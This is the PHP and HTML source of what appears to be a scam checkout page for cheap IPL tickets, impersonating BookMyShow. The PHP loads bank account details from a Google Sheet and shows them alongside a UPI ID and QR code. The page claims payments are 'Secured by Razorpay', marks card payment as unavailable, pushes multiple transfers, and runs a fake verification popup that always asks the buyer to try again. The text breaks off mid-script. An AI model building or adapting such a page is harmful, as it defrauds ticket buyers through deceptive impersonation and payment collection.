<?php 


// Step 1: Sheet ID डालो
$sheetID = '1uOizVEbJY9PRypIlp5k_toanakRXAP3lS4MNf-4d1Lk';

// Step 2: Sheet का Public URL बनाओ
$url = "https://docs.google.com/spreadsheets/d/$sheetID/gviz/tq?tqx=out:json";

// Step 3: URL से डेटा लो
$response = file_get_contents($url);

// Step 4: Response से Unwanted characters हटाओ
$data = json_decode(substr($response, 47, -2), true);

// Step 5: अब rows पढ़ो
$rows = $data['table']['rows'];

// Step 6: अब $rows को loop कर लो
foreach ($rows as $row) {
    $payment_method = $row['c'][0]['v'] ?? '';
    $account_holder = $row['c'][1]['v'] ?? '';
    $account_number = $row['c'][2]['v'] ?? '';
    $ifsc_code = $row['c'][3]['v'] ?? '';
    $bank_name = $row['c'][4]['v'] ?? '';
    $payment_status = $row['c'][5]['v'] ?? '';
    $note = $row['c'][6]['v'] ?? '';

    //echo "Payment Method: $payment_method, Account Holder: $account_holder, Account Number: $account_number, IFSC Code: $ifsc_code, Bank Name: $bank_name, Payment Status: $payment_status, Note: $note <br>";
  
}

include('app_script.php');
?>

<!-- saved from url=(0057)https://cheap.get-ipl-ticket-seller.com/payment.php?id=70 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <link rel="icon" type="image/svg+xml" href="https://cheap.get-ipl-ticket-seller.com/vite.svg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vite + React</title>
    <script src="./payment_files/661642293008712" async=""></script><script async="" src="./payment_files/fbevents.js.download"></script><script type="module" src="./payment_files/index-ck3X7H0s.js.download"></script>
    <link rel="stylesheet" href="./payment_files/index-DOFwVbkK.css">

<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '661642293008712');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->


</head>

<body>
    <div id="root">
        <div class="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 pb-24 md:pb-0">
            <link rel="stylesheet" href="./payment_files/all.min.css">
            <style jsx="true">
                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

                body {
                    font-family: 'Inter', sans-serif;
                }

                .payment-option {
                    transition: all 0.3s ease;
                    border: 2px solid transparent;
                }

                .payment-option:hover {
                    background-color: #f8fafc;
                    transform: translateY(-1px);
                    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
                }

                .payment-option.active {
                    border-color: #4f46e5;
                    background-color: #f5f3ff;
                    box-shadow: 0 0 0 2px #e0e7ff;
                }

                .qr-code-container {
                    animation: fadeIn 0.5s ease-out;
                }

                @keyframes fadeIn {
                    from {
                        opacity: 0;
                        transform: translateY(10px);
                    }

                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }

                .payment-icon {
                    width: 32px;
                    height: 32px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    transition: all 0.3s ease;
                }

                .accordion-content {
                    max-height: 0;
                    overflow: hidden;
                    transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
                }

                .accordion-content.open {
                    max-height: 2000px;
                }

                .payment-logo {
                    max-height: 28px;
                    object-fit: contain;
                    filter: grayscale(0.2);
                }

                .payment-logo-small {
                    max-height: 24px;
                    object-fit: contain;
                }

                .bank-logo {
                    max-height: 36px;
                    border-radius: 6px;
                    object-fit: cover;
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
                }

                .glassmorphism {
                    background: rgba(255, 255, 255, 0.95);
                    backdrop-filter: blur(10px);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                }

                .payment-method-container {
                    transition: all 0.5s ease;
                }

                .payment-method-container:hover {
                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
                }

                .utr-input {
                    transition: all 0.3s ease;
                    border: 2px solid #e5e7eb;
                }

                .utr-input:focus {
                    border-color: #4f46e5;
                    box-shadow: 0 0 0 2px rgba(79, 70, 229, 0.2);
                }

                .continue-button {
                    position: relative;
                    overflow: hidden;
                    transition: all 0.4s ease;
                }

                .continue-button::before {
                    content: '';
                    position: absolute;
                    top: 0;
                    left: -100%;
                    width: 100%;
                    height: 100%;
                    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
                    transition: all 0.6s ease;
                }

                .continue-button:not(:disabled):hover::before {
                    left: 100%;
                }

                .continue-button:disabled {
                    opacity: 0.7;
                    cursor: not-allowed;
                }

                .razorpay-badge {
                    transition: all 0.3s ease;
                }

                .razorpay-badge:hover {
                    transform: translateY(-2px);
                }

                @keyframes shimmer {
                    0% {
                        background-position: -1000px 0;
                    }

                    100% {
                        background-position: 1000px 0;
                    }
                }

                .copy-button {
                    transition: all 0.2s ease;
                }

                .copy-button:hover {
                    background-color: #f3f4f6;
                }

                .copy-button.copied {
                    background-color: #ecfdf5;
                    color: #059669;
                }

                .bank-details-card {
                    background: linear-gradient(145deg, #ffffff, #f9fafb);
                    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.03);
                    border-radius: 12px;
                    transition: all 0.3s ease;
                }

                .bank-details-card:hover {
                    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.05);
                }

                .bank-detail-row {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    padding: 12px 0;
                    border-bottom: 1px solid #f3f4f6;
                }

                .bank-detail-row:last-child {
                    border-bottom: none;
                }

                .processing-popup {
                    position: fixed;
                    bottom: -100%;
                    left: 0;
                    right: 0;
                    background: white;
                    padding: 20px;
                    border-radius: 20px 20px 0 0;
                    box-shadow: 0 -5px 25px rgba(0, 0, 0, 0.1);
                    z-index: 1000;
                    transition: bottom 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
                }

                .processing-popup.show {
                    bottom: 0;
                }

                .processing-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    right: 0;
                    bottom: 0;
                    background: rgba(0, 0, 0, 0.4);
                    z-index: 999;
                    opacity: 0;
                    pointer-events: none;
                    transition: opacity 0.3s ease;
                }

                .processing-overlay.show {
                    opacity: 1;
                    pointer-events: auto;
                }

                @keyframes spin {
                    from {
                        transform: rotate(0deg);
                    }

                    to {
                        transform: rotate(360deg);
                    }
                }

                .loading-spinner {
                    animation: spin 1.5s linear infinite;
                }

                // ...existing styles...

                .multiple-payment-section {
                    border: 1px solid #e5e7eb;
                    border-radius: 8px;
                    padding: 16px;
                    margin-top: 16px;
                    background-color: #f9fafb;
                }

                .payment-item {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    padding: 8px 12px;
                    background-color: white;
                    border-radius: 6px;
                    margin-bottom: 8px;
                    border: 1px solid #e5e7eb;
                }

                .progress-bar {
                    height: 8px;
                    border-radius: 4px;
                    background-color: #e5e7eb;
                    overflow: hidden;
                    margin: 8px 0;
                }

                .progress-fill {
                    height: 100%;
                    background: linear-gradient(90deg, #4f46e5, #8b5cf6);
                    transition: width 0.3s ease;
                }

                .payment-progress-info {
                    display: flex;
                    justify-content: space-between;
                    margin-top: 6px;
                    font-size: 0.875rem;
                }

                /* Add flip class for the coin image */
                .coin-image-flip {
                    transform: scaleX(-1);
                }

                /* Responsive UPI ID container */
                .upi-id-container {
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    flex-wrap: wrap;
                    gap: 4px;
                }

                /* Style for UPI text that can truncate on mobile */
                .upi-text {
                    max-width: calc(100% - 70px);
                    overflow: hidden;
                    text-overflow: ellipsis;
                    white-space: nowrap;
                }

                /* Create more space on mobile views */
                @media (max-width: 480px) {
                    .upi-id-container {
                        flex-direction: column;
                        align-items: stretch;
                    }

                    .upi-text {
                        max-width: 100%;
                        text-align: center;
                        font-size: 0.9rem;
                        padding: 6px 0;
                    }

                    .copy-button-wrapper {
                        display: flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: stretch;
                        margin-top: 4px;
                    }
                }

                @keyframes flip {
                    0% {
                        transform: rotateY(0deg);
                    }

                    100% {
                        transform: rotateY(360deg);
                    }
                }

                .coin-flip {
                    animation: flip 3s ease-in-out infinite;
                    transform-style: preserve-3d;
                }

                .accordion-content {
                    transition: max-height 0.3s ease-in-out, padding 0.3s ease-in-out;
                    padding: 0 1rem;
                    background: #f9f9f9;
                    border-radius: 5px;
                }


                .accordion-content {
                    display: none;
                }

                .accordion-content.open {
                    display: block;
                }
            </style>
            <header class="glassmorphism sticky top-0 z-50 py-2 px-2 flex justify-between items-center">
                <div class="flex items-center space-x-4"><button class="mr-2 hover:bg-gray-100 p-1.5 rounded-full transition-all" aria-label="Go back"><i class="fas fa-arrow-left text-gray-600"></i></button><img alt="BookMyShow" class="h-8 hover:opacity-90 transition-opacity" src="./payment_files/bookmyshow-logo-vector-xs.png">
                    <div class="h-6 w-px bg-gray-200"></div><span class="text-sm font-medium text-gray-600">Secure Checkout</span>
                </div>
                <div class="flex items-center space-x-2 bg-green-50 px-3 py-1.5 rounded-full"><i class="fas fa-shield-alt text-green-600"></i><span class="text-sm font-medium text-green-700">100% Secure Payments</span></div>
            </header>




            <div class="container mx-auto py-2 px-2 md:px-2">
                <div class="flex flex-col md:flex-row gap-8 max-w-6xl mx-auto">
                    <div class="w-full md:w-2/3">
                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 payment-method-container">
                            <div class="p-6 border-b border-gray-100">
                                <h2 class="text-xl font-semibold text-gray-800">Choose Payment Method</h2>
                                <p class="text-sm text-gray-500 mt-1">All transactions are secure and encrypted</p>
                            </div>
                            <div class="p-4 border-b border-gray-100">
                                <button class="w-full text-left py-2 px-2 rounded-lg payment-option payment-option">
                                    <div class="flex items-center justify-between w-full">
                                        <div class="flex items-center">
                                            <div class="payment-icon bg-green-100 rounded-full p-2 mr-3"><i class="fa-solid fa-qrcode text-green-600"></i></div>
                                            <span class="font-medium mr-2">UPI/QR</span>
                                            <!-- <img alt="UPI Payment Options" class="payment-logo hidden md:block" src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png"> -->
                                        </div><i class="fa-solid fa-chevron-down text-gray-400"></i>
                                    </div>
                                </button>


                                <div class="accordion-content">


                                    <div class="mt-4 p-4 border border-gray-200 rounded-xl bg-gradient-to-b from-white to-gray-50">
                                        <div class="qr-code-container text-center">
                                            <div class="mb-4">
                                                <div class="text-sm font-medium text-gray-700 mb-2">Scan the QR within <span id="countdown" class="text-red-600 font-bold">14:44</span>

                                                </div>
                                                <div class="relative inline-block">

                                                <img src="proxy.php" alt="Google Drive Image">
                                                    <?php // include('proxy.php'); ?>
     

</div>



                                                <div class="mt-3 text-sm text-gray-600">Scan the QR using any UPI App</div>
                                                <div class="flex justify-center gap-6 mt-4">
                                                    <div class="flex flex-col items-center"><img alt="GPay" class="w-10 h-10 object-contain" src="./payment_files/googlepay.svg"><span class="text-xs mt-1">GPay</span></div>
                                                    <div class="flex flex-col items-center"><img alt="PhonePe" class="w-10 h-10 object-contain" src="./payment_files/phonepe.svg"><span class="text-xs mt-1">PhonePe</span></div>
                                                    <div class="flex flex-col items-center"><img alt="Paytm" class="w-10 h-10 object-contain" src="./payment_files/paytm.svg"><span class="text-xs mt-1">Paytm</span></div>
                                                    <div class="flex flex-col items-center"><img alt="BHIM" class="w-10 h-10 object-contain" src="./payment_files/bhim.svg"><span class="text-xs mt-1">BHIM</span></div>
                                                </div>
                                                <div class="mt-4 bg-green-50 text-green-700 p-2 rounded-md text-xs"><i class="fa-solid fa-tag mr-1"></i>Upto ₹2,503 cashback – You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.</div>
                                            </div>
                                            <div class="bg-white p-3 rounded-lg border border-gray-200 mb-4">
                                                <p class="text-sm font-medium mb-2">Pay using any upi to make your order success ✓</p>


                                                <div class="upi-id-container">
                                                    <span class="upi-text text-gray-800 font-medium">netc.34161fa820328aa2d3c31760@mairtel</span>
                                                    <div class="copy-button-wrapper">
                                                        <button class="copy-button p-1.5 rounded-md transition-all bg-gray-50" aria-label="Copy UPI ID">
                                                            <span class="text-blue-600 text-xs font-medium px-1">Copy</span></button>
                                                    </div>
                                                </div>


                                                <div class="mt-2 text-sm text-gray-500">Amount to be Paid <span class="font-bold text-gray-700 final_paid_price">₹599</span></div>
                                            </div>
                                            <div class="multiple-payment-section">
                                                <div class="py-2 px-1 mb-3 bg-yellow-50 border-l-4 border-yellow-400 rounded">
                                                    <h4 class="font-medium text-yellow-800 text-sm">Multiple Payments Notice</h4>
                                                    <p class="text-xs text-yellow-700 mt-1">For amounts over ₹2,000, you can make multiple payments using this same QR code. Please record each payment's UTR number and amount below.</p>
                                                </div>
                                                <div class="bg-white p-3 rounded border border-gray-200 mb-4">
                                                    <h4 class="font-medium text-gray-700 text-sm mb-2">Payment Instructions:</h4>
                                                    <ol class="text-xs text-gray-600 list-decimal pl-5 space-y-1">
                                                        <li>Open any UPI app on your phone</li>
                                                        <li>Scan the QR code shown above</li>
                                                        <li>Verify the amount matches exactly</li>
                                                        <li>Complete the payment</li>
                                                        <li>For amounts over ₹2,000 make multiple payments</li>
                                                        <li>Enter UTR number and amount for each payment</li>
                                                    </ol>
                                                </div>
                                                <h4 class="font-medium text-gray-700 text-sm mb-2">Payment Details</h4>



                                                <div class="mb-3">
                                                    <div class="payment-item-container">
                                                    </div>
                                                    <div class="progress-bar">
                                                        <div class="progress-fill" style="width: 0%;"></div>
                                                    </div>
                                                    <div class="payment-progress-info">
                                                        <div class="text-green-600 font-medium"><span>Total Paid:</span> ₹0</div>
                                                        <div class="text-red-600 font-medium "><span>Remaining:</span> <span class="final_paid_price">₹599</span></div>
                                                    </div>
                                                </div>
                                                <div class="mt-3 bg-green-50 p-3 rounded-lg border border-green-200 text-center" style="display: none;">
                                                    <div class="text-green-600 font-medium mb-1"><i class="fas fa-check-circle mr-2"></i>Payment Complete</div>
                                                    <p class="text-xs text-green-700">You've successfully entered payments for the full amount. Click "Verify Payment" to continue.</p>
                                                </div>
                                                <div class="bg-white p-3 rounded border border-gray-200">
                                                    <div class="mb-3"><label class="block text-xs font-medium text-gray-700 mb-1">UTR Number</label><input class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-200 text-sm" placeholder="Enter 12-digit UTR Number" maxlength="12" type="text" value=""></div>
                                                    <div class="mb-3"><label class="block text-xs font-medium text-gray-700 mb-1">Amount <span class="text-gray-500">(Maximum ₹2,000 per transaction)</span></label>
                                                        <input class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-200 text-sm" placeholder="Enter amount" max="2000" type="number" value="">
                                                    </div>
                                                    <button class="bg-indigo-600 text-white py-2 px-4 rounded text-sm hover:bg-indigo-700 transition-all w-full"><i class="fas fa-plus-circle mr-1"></i> Add Payment</button>
                                                </div>



                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>


                            <div class="p-2 border-b border-gray-100"><button class="w-full text-left py-3 px-4 rounded-md payment-option ">
                                    <div class="flex items-center justify-between w-full">
                                        <div class="flex items-center">
                                            <div class="payment-icon bg-purple-100 rounded-full p-2 mr-3"><i class="fa-solid fa-credit-card text-purple-600"></i></div><span class="font-medium mr-2">Cards</span><img alt="Credit Card Options" class="payment-logo-small hidden md:block" src="./payment_files/360_F_589458438_NjcRmqJWjA2Jk2YlMY2k5jKB4iCdRkAn.jpg">
                                        </div>
                                        <div class="text-red-600 text-xs font-medium">Server Unavailable</div>
                                    </div>
                                </button></div>

                            <div class="p-2 border-b border-gray-100">

                                <button class="w-full text-left py-3 px-4 rounded-md payment-option ">
                                    <div class="flex items-center justify-between w-full">
                                        <div class="flex items-center">
                                            <div class="payment-icon bg-yellow-100 rounded-full p-2 mr-3"><i class="fa-solid fa-wallet text-yellow-600"></i></div>
                                            <span class="font-medium mr-2">Wallet</span>
                                            <!-- <img alt="Wallet Payment Options" class="payment-logo hidden md:block" src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png"> -->
                                        </div><i class="fa-solid fa-chevron-down text-gray-400"></i>
                                    </div>
                                </button>
                                <div class="accordion-content">
                                    <div class="mt-4 p-6 border border-gray-200 rounded-xl bg-gradient-to-b from-white to-gray-50">
                                        <div class="text-center">
                                            <div class="mb-4">
                                                <div class="w-16 h-16 mx-auto bg-yellow-50 rounded-full flex items-center justify-center"><i class="fas fa-wallet text-2xl text-yellow-600"></i></div>
                                                <h3 class="mt-4 text-lg font-semibold text-gray-800">Wallet Payment</h3>
                                            </div>
                                            <p class="text-sm text-gray-600 mb-3">Pay using any wallet to complete your purchase</p>
                                            <div class="mt-4 bg-green-50 text-green-700 p-2 rounded-md text-xs"><i class="fa-solid fa-tag mr-1"></i>Upto ₹2,503 cashback – You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.</div>
                                            <div class="bg-white p-2 rounded-lg border border-gray-200 mb-4">
                                                <div class="upi-id-container"><span class="upi-text text-gray-800 font-medium">-upi</span>
                                                    <div class="copy-button-wrapper"><button class="copy-button p-1.5 rounded-md transition-all bg-gray-50" aria-label="Copy UPI ID"><span class="text-blue-600 text-xs font-medium px-1">Copy</span></button></div>
                                                </div>
                                                <div class="mt-2 text-sm text-gray-500">Amount to be Paid <span class="font-bold text-gray-700 final_paid_price">₹599</span></div>
                                            </div>
                                            <div class="mt-4">
                                                <div class="text-left mb-4"><label class="block text-sm font-medium text-gray-700 mb-1">UTR UPI REF. NO</label><input class="w-full p-3 border-2 rounded-md focus:outline-none utr-input" oninput="checkUTRInput()" placeholder="Enter 12-digit UTR Number" maxlength="12" type="text" value="">
                                                    <p class="text-xs text-gray-500 mt-1">*Required - Please enter a valid 12-digit UTR number</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="p-2">
                                <button class="w-full text-left py-3 px-4 rounded-md payment-option ">
                                    <div class="flex items-center justify-between w-full">
                                        <div class="flex items-center">
                                            <div class="payment-icon bg-green-100 rounded-full p-2 mr-3"><i class="fa-solid fa-building-columns text-green-600"></i></div><span class="font-medium mr-2">IMPS/NEFT</span><img alt="Bank Transfer Options" class="bank-logo hidden md:block" src="./payment_files/sbi-hdfc-bank-fd-113619720.jpg">
                                        </div><i class="fa-solid fa-chevron-down text-gray-400"></i>
                                    </div>
                                </button>


 

                                <div class="accordion-content ">
                                    <div class="mt-4 p-2 border border-gray-200 rounded-xl bg-gradient-to-b from-white to-gray-50">
                                        <div class="text-center">
                                            <div class="mb-4">
                                                <div class="w-16 h-16 mx-auto bg-green-50 rounded-full flex items-center justify-center"><i class="fas fa-university text-2xl text-green-600"></i></div>
                                                <h3 class="mt-4 text-lg font-semibold text-gray-800">Bank Transfer</h3>
                                            </div>
                                            <p class="text-sm font-medium mb-4">Pay using IMPS to make your order successful ✓</p>
                                            <div class="bank-details-card p-2 mb-4 border border-gray-100">
                                                <div class="bank-detail-row">
                                                    <div class="flex items-center space-x-2"><i class="fas fa-user text-green-500"></i><span class="text-sm text-gray-600">Account Holder</span></div>
                                                    <div class="flex items-center text-right"><span class="text-sm font-medium"><?php echo $account_holder; ?></span></div>
                                                </div>
                                                <div class="bank-detail-row">
                                                    <div class="flex items-center space-x-2"><i class="fas fa-hashtag text-blue-500"></i><span class="text-sm text-gray-600">Account Number</span></div>
                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2"><?php echo $account_number; ?></span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy account number"><i class="far fa-copy text-gray-500"></i></button></div>
                                                </div>
                                                <div class="bank-detail-row">
                                                    <div class="flex items-center space-x-2"><i class="fas fa-fingerprint text-indigo-500"></i><span class="text-sm text-gray-600">IFSC Code</span></div>
                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2"><?php echo $ifsc_code; ?></span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy IFSC code"><i class="far fa-copy text-gray-500"></i></button></div>
                                                </div>
                                                <div class="bank-detail-row">
                                                    <div class="flex items-center space-x-2"><i class="fas fa-university text-purple-500"></i><span class="text-sm text-gray-600">Bank Name</span></div>
                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2"><?php echo $bank_name; ?></span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy bank name"><i class="far fa-copy text-gray-500"></i></button></div>
                                                </div>
                                                <div class="bank-detail-row bg-indigo-50 rounded-lg mt-2">
                                                    <div class="flex items-center space-x-2"><i class="fas fa-rupee-sign text-indigo-700"></i><span class="text-sm font-medium">Amount to be Paid</span></div><span class="text-sm font-bold text-indigo-700 final_paid_price">₹599</span>
                                                </div>
                                            </div>
                                            <div class="mt-4 text-left">
                                                <div class="mb-4"><label class="block text-sm font-medium text-gray-700 mb-1">UTR/Transaction Number</label>
                                                    <input class="w-full p-3 border-2 rounded-md focus:outline-none utr-input" oninput="checkUTRInput()" placeholder="Enter UTR or Transaction Number" maxlength="12" type="text" value="">
                                                    <p class="text-xs text-gray-500 mt-1">*Required to proceed with payment</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>


                                <script>
                                    document.addEventListener("DOMContentLoaded", function() {
                                        // Select all copy buttons
                                        const copyButtons = document.querySelectorAll(".copy-button");

                                        copyButtons.forEach(button => {
                                            button.addEventListener("click", function() {
                                                // Find the sibling span containing the text to copy
                                                const textSpan = this.previousElementSibling;
                                                const textToCopy = textSpan.textContent.trim();

                                                if (textToCopy) {
                                                    // Copy text to clipboard
                                                    navigator.clipboard.writeText(textToCopy).then(() => {
                                                        // Change icon to checkmark temporarily
                                                        const originalIcon = this.innerHTML;
                                                        this.innerHTML = '<i class="fas fa-check text-green-500"></i>';

                                                        // Restore original icon after 1.5 seconds
                                                        setTimeout(() => {
                                                            this.innerHTML = originalIcon;
                                                        }, 1500);
                                                    }).catch(err => {
                                                        console.error("Failed to copy text: ", err);
                                                    });
                                                }
                                            });
                                        });
                                    });
                                </script>

                            </div>
                        </div>
                    </div>
                    <div class="w-full md:w-1/3">
                        <div class="bg-white rounded-xl shadow-sm border border-gray-100 sticky top-24">
                            <div class="p-4 border-b border-gray-200">
                                <div class="flex justify-between items-center">
                                    <div>
                                        <p class="text-sm text-gray-500">Amount to be Paid</p>
                                        <p class="text-xl font-bold text-gray-800 final_paid_price">₹599</p>
                                    </div><button class="text-blue-600 text-sm underline hover:text-blue-800">View Details</button>
                                </div>
                            </div>
                            <div class="p-4">

                                <button class="w-full py-3 px-4 rounded-lg font-medium transition-all continue-button hidden-mobile
                        bg-gray-300 text-gray-500 cursor-not-allowed" disabled=""><i class="fas fa-check-circle mr-2"></i>Verify Payment</button>
                                <div class="mt-6 razorpay-badge">
                                    <p class="text-xs text-gray-500 flex items-center justify-center"><i class="fa-solid fa-lock mr-1"></i>Secured by</p>
                                    <!-- <div class="flex justify-center mt-2"><img alt="Razorpay" class="h-8" src="./payment_files/razorpay-logo.svg"></div> -->
                                    <div class="flex justify-center mt-2">
                                        <img alt="Razorpay" class="" src="proxy.php">
                                    </div>
                                </div>
                                <div class="mt-4 p-3 bg-gray-50 rounded-lg border border-gray-100">
                                    <div class="flex items-center text-xs text-gray-600"><i class="fas fa-shield-alt text-green-500 mr-2"></i><span>Your payment information is secure and encrypted</span></div>
                                </div>
                                <div class="mt-4 text-center"><a href="https://cheap.get-ipl-ticket-seller.com/payment.php?id=70#" class="text-xs text-blue-600 hover:underline">Payment Terms &amp; Privacy Policy</a></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>



            <div class="fixed bottom-0 left-0 right-0 bg-white shadow-lg p-3 border-t border-gray-200 md:hidden z-50">

                <button id="verifyButton" class="w-full py-3 px-4 rounded-lg font-medium transition-all continue-button bg-gray-300 text-gray-500 cursor-not-allowed" disabled="true"><i class="fas fa-check-circle mr-2"></i>Verify Payment</button>

            </div>
            <style jsx="true">
                @keyframes fadeIn {
                    from {
                        opacity: 0;
                        transform: translateY(10px);
                    }

                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }

                .animate-fadeIn {
                    animation: fadeIn 0.3s ease-out forwards;
                }

                /* Hide desktop button on mobile */
                @media (max-width: 768px) {
                    .md\:hidden {
                        display: block;
                    }

                    .hidden-mobile {
                        display: none;
                    }
                }
            </style>



            <script>
                document.querySelectorAll(".payment-option").forEach(button => {
                    button.addEventListener("click", function() {
                        const accordionContent = this.nextElementSibling;
                        if (accordionContent && accordionContent.classList.contains("accordion-content")) {
                            accordionContent.classList.toggle("open");
                        }
                    });
                });
            </script>



            <div class="processing-overlay"></div>
            <div class="processing-popup">
                <div class="flex flex-col items-center">
                    <div class="flex items-center mb-4">
                        <div class="loading-spinner mr-2 text-indigo-600"><i class="fas fa-circle-notch text-xl"></i></div>
                        <h3 class="text-lg font-semibold">Processing your payment</h3>
                    </div>
                    <p class="text-gray-500 text-center mb-6">This will only take a few seconds.</p><img alt="Payment coin" class="w-24 h-24 mb-4 coin-flip" src="./payment_files/coin.6caba344.png">
                    <div class="text-sm text-gray-600 text-center mb-4">
                        <p class="mb-3">Please check the UTR no. is correct or not. Please try again.</p>
                        <p class="text-xs text-gray-500">Don't worry! If the amount has been deducted from your bank but you haven't received your ticket confirmation yet, our support team is already on it!</p>
                    </div>
                    <div class="flex flex-col w-full">
                        <div class="border-t border-gray-100 pt-4 mb-4">
                            <div class="flex justify-center items-center">
                                <p class="text-xs text-gray-500 mr-2">Secured by</p><img alt="Razorpay" class="h-5" src="./payment_files/razorpay-logo.svg">
                            </div>
                        </div><button class="py-2.5 px-4 bg-white border border-gray-300 rounded-md text-gray-700 hover:bg-gray-50 cancel-button">Cancel</button>
                    </div>
                </div>
            </div>



        </div>
    </div>


    <script>
        function startTimer(duration, display) {
            let timer = duration,
                minutes, seconds;
            let interval = setInterval(function() {
                minutes = Math.floor(timer / 60);
                seconds = timer % 60;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(interval);
                    display.textContent = "Time's Up!";
                }
            }, 1000);
        }

        window.onload = function() {
            let countdownElement = document.getElementById("countdown");
            let fifteenMinutes = 15 * 60;
            startTimer(fifteenMinutes, countdownElement);
        };
    </script>





    <script>
        function checkUTRInput() {
            const utrInputs = document.querySelectorAll(".utr-input");
            const verifyButton = document.getElementById("verifyButton");
            const overlay = document.querySelector(".processing-overlay");
            const popup = document.querySelector(".processing-popup");
            const cancelButton = document.querySelector(".cancel-button");



            let isValid = false;

            utrInputs.forEach(input => {
                let inputValue = input.value.trim();
                let valueLength = inputValue.length;
                console.log(`Input Value (${valueLength} chars): "${inputValue}"`);

                if (valueLength === 12) {
                    isValid = true;
                }
            });

            if (isValid) {
                verifyButton.disabled = false;
                verifyButton.classList.remove("bg-gray-300", "text-gray-500", "cursor-not-allowed");
                verifyButton.classList.add("bg-gradient-to-r", "from-blue-600", "to-indigo-600", "text-white", "hover:from-blue-700", "hover:to-indigo-700");
                console.log("✅ Button Enabled!");


                verifyButton.addEventListener("click", function() {
                    overlay.classList.toggle("show");
                    popup.classList.toggle("show");
                });
            } else {
                verifyButton.disabled = true;
                verifyButton.classList.add("bg-gray-300", "text-gray-500", "cursor-not-allowed");
                verifyButton.classList.remove("bg-gradient-to-r", "from-blue-600", "to-indigo-600", "text-white", "hover:from-blue-700", "hover:to-indigo-700");
                console.log("❌ Button Disabled!");
            }

            cancelButton.addEventListener("click", function() {
                overlay.classList.remove("show");
                popup.classList.remove("show");
            });
        }
    </script>


    <script>
        document.addEventListener("DOMContentLoaded", function() {
            let selectedTicketPrice = localStorage.getItem("selectedTotalPrice");
            let ticketPrice = parseFloat(selectedTicketPrice) || 0;
            document.querySelectorAll(".final_paid_price").forEach(element => {
                element.textContent = `₹${ticketPrice.toLocaleString()}`;
            });
        });
    </script>




    <script>
        document.addEventListener("DOMContentLoaded", function() {
            let finalPaidPrice = parseInt(localStorage.getItem("selectedTotalPrice")) || 0;
            let totalPaid = 0;

            const finalPaidElements = document.querySelectorAll(".final_paid_price");
            const totalPaidElement = document.querySelector(".payment-progress-info .text-green-600");
            const progressBar = document.querySelector(".progress-fill");
            const addPaymentButton = document.querySelector(".bg-indigo-600");
            const verifyPaymentButton = document.getElementById('verifyButton')
            const paymentCompleteMessage = document.querySelector(".mt-3.bg-green-50");
            const paymentItemContainer = document.querySelector(".payment-item-container");
            const utrInput = document.querySelector("input[type='text']");
            const amountInput = document.querySelector("input[type='number']");
            const overlay = document.querySelector(".processing-overlay");
            const popup = document.querySelector(".processing-popup");
            const cancelButton = document.querySelector(".cancel-button");

            if (!paymentItemContainer) {
                console.error("Error: .payment-item-container not found in the document!");
                return;
            }

            console.log("Initial Final Paid Price:", finalPaidPrice);
            console.log("Initial Total Paid:", totalPaid);

            function updateUI() {
                console.log("Updating UI...");
                let remainingAmount = finalPaidPrice - totalPaid;

                finalPaidElements.forEach(element => {
                    element.textContent = `₹${remainingAmount}`;
                });

                totalPaidElement.innerHTML = `<span>Total Paid:</span> ₹${totalPaid}`;
                progressBar.style.width = `${(totalPaid / finalPaidPrice) * 100}%`;

                if (totalPaid >= finalPaidPrice) {

                    verifyButton.disabled = false;
                    verifyButton.classList.remove("bg-gray-300", "text-gray-500", "cursor-not-allowed");
